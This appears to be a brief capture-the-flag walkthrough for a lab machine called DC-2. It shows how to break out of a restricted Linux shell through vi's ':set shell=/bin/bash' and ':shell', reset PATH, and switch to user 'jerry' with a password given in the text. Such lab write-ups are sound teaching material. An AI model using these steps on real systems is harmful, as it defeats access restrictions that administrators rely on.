Escaping Restricted Linux Shells


We need to change user to “jerry” but su command is not in our allowed command’s list.

a) One of the most well documented techniques is to spawn a shell from within an editor such as 'vi' or 'vim'. Open any file using one of these editors and type the following and execute it from within the editor:


$ vi

Type on the editor:

:set shell=/bin/bash
:shell

b) Exporte PATH variable so that you can execute all commands.

tom@DC-2:~$ export PATH=/bin:/usr/bin:$PATH


c) Chage to user “jerry”

$ su jerry


• Username: jerry.
• Password: adipiscing.

Output:
jerry@DC-2:/home/tom$
